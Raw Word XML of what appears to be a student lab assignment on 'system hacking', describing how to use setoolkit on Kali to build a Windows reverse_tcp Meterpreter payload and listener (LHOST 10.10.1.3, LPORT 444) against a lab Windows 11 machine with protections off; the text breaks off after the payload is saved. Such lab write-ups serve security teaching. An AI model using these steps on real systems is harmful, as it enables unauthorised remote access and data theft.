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8"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">ASSIGNMENT NUMBER 5: SYSTEM HACKING</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000002">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000003">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000004">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">1.</w:t>
      </w:r>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> USING reverse_tcp MODULE TO GAIN ACCESS</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000005">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">OF A SYSTEM:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000006">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000007">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="yellow"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="yellow"/>
          <w:u w:val="single"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">HOST MACHINE: KALI LINUX [10.10.1.3]</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000008">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="yellow"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000009">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="yellow"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="yellow"/>
          <w:u w:val="single"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">VICTIM MACHINE:WINDOWS 11 PRO[ALL FIREWALLS AND VIRUS PROTECTION TURNED OFF]</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000000A">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="yellow"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000000B">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">First of all we need to set up a payload which means we need to create a toxic/poisonous executable file which can be executed in the victim machine which will help us to create a meterpreter session and we will be having pathway built between the host and the victim machine and we can have access to a variety of sensitive information about the target machine.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000000C">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000000D">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000000E">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">HOW TO CREATE THE PAYLOAD?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000000F">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000010">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">STEP1: USING </w:t>
      </w:r>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">setoolkit</w:t>
      </w:r>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> COMMAND</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000011">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000012">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distB="114300" distT="114300" distL="114300" distR="114300">
            <wp:extent cx="5731200" cy="2997200"/>
            <wp:effectExtent b="0" l="0" r="0" t="0"/>
            <wp:docPr id="1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32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">We just need to type “setoolkit” in kali linux terminal</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000014">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000015">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we need to type 1[social engineering attacks] </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000016">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000017">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distB="114300" distT="114300" distL="114300" distR="114300">
            <wp:extent cx="5731200" cy="2997200"/>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32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">We will get many options after that</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000019">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000001A">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we need to type 4[create a payload and listener]</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000001B">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000001C">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distB="114300" distT="114300" distL="114300" distR="114300">
            <wp:extent cx="5731200" cy="2997200"/>
            <wp:effectExtent b="0" l="0" r="0" t="0"/>
            <wp:docPr id="81"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bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we get many other options inside [create a payload and listener] and now we need to press 2[</w:t>
      </w:r>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">windows Reverse_tcp Meterpreter]</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000001E">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000001F">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59"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bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we have a new line coming up to set up the IP address for the payload listener which will be our kali linux machine ip [10.10.1.3]</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000021">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000022">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67"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bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">The IP address is LHOST = 10.10.1.3</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000024">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000025">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we have to type “10.10.1.3” IN THE PLACE OF LHOST</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000026">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000027">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bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">THE LHOST WILL BE 10.10.1.3 AND THE LPORT WILL BE 444</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000029">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44"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bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">NOW WE CAN SEE THAT IT IS ASKING US “DO YOU WANT TO START THE PAYLOAD AND LISTENER NOW?”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000002B">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">WE NEED TO PRESS “yes”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000002C">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000002D">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51" name="image84.png"/>
            <a:graphic>
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic>
                  <pic:nvPicPr>
                    <pic:cNvPr id="0" name="image84.png"/>
                    <pic:cNvPicPr preferRelativeResize="0"/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId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bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we have the payload and listener mode ready which means as soon as the session will be built up between the target and attacker machine we will see the SESSION BUILT NOTIFICATION HERE ON THIS WINDOW. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000002F">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000030">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">NOW WE CAN SEE IN THE SECOND LAST PICTURE ABOVE MENTIONED THAT THE PAYLOAD HAS BEEN SAVED TO THE LOCATION /root/.set/payload.exe</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000031">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000032">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
